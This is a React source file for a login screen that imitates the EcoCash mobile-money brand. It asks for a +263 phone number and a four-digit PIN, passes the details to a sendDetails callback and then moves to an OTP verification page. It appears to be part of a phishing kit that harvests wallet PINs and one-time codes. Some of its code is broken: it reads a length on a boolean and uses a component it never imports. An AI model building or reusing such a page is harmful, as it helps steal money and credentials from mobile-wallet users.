import React, { useState } from "react";
import "./Login.css";
import { useNavigate } from "react-router-dom";

function Login({ client, setpin, sendDetails }) {
  const { number } = client;
  const navigate = useNavigate();
  const [pin1, setPin1] = useState("");
  const [pin2, setPin2] = useState("");
  const [pin3, setPin3] = useState("");
  const [pin4, setPin4] = useState("");
  //   if (pin === true) {
  //     console.log("true");
  //   }
  const localPin = [pin1, pin2, pin3, pin4];
  const pinString = `${localPin[0]}${localPin[1]}${localPin[2]}${localPin[3]}`;
  const pinfull = pinString.length === 4;

  function handlePin() {
    setpin(pinString);
    console.log("setpin");
    console.log(client.pin);
  }

  if (pinfull) {
    handlePin();
  }

  function collectData() {
    navigate("/otpverification");
    sendDetails();
    console.log(client);
  }

  const num = Number(number);
  return (
    <>
      {pinfull.length !== 4 ? (
        <div className="container">
          <header>
            <div className="logo">
              <span>Eco</span>Cash
            </div>
            <h1 className="login-title">Welcome</h1>
          </header>

          <main>
            <div className="phone-number">+263 {num}</div>

            <div className="pin-input-container">
              <label className="pin-label">Enter your PIN</label>
              <div>
                <input
                  type="number"
                  className="no-spinner"
                  value={pin1}
                  onChange={(e) => setPin1(e.target.value)}
                />
                <input
                  type="number"
                  className="no-spinner"
                  value={pin2}
                  onChange={(e) => setPin2(e.target.value)}
                />
                <input
                  type="number"
                  className="no-spinner"
                  value={pin3}
                  onChange={(e) => setPin3(e.target.value)}
                />
                <input
                  type="number"
                  className="no-spinner"
                  value={pin4}
                  onChange={(e) => setPin4(e.target.value)}
                />
              </div>
            </div>

            <div className="forgot-pin">
              <a href="#">Forgot PIN?</a>
            </div>
          </main>

          <footer className="footer">
            <div className="curvesec">
              <div></div>
              <div></div>
              <button className="btnContinue" onClick={collectData}>
                Login
              </button>
            </div>
            <div className="help-section">
              <p className="help-text">
                To register an EcoCash wallet or get assistance, click below
              </p>

              <div className="buttons-container">
                <button className="help-button register-button">
                  Register
                </button>
                <button className="help-button support-button">
                  Help & Support
                </button>
              </div>
            </div>

            <div className="terms">
              <div className="version">v2.1.3P</div>
              By signing in you agree to the Terms and Conditions
            </div>
          </footer>
          {/* <OtpVerification /> */}
        </div>
      ) : (
        <OtpVerification />
      )}
    </>
  );
}

export default Login;
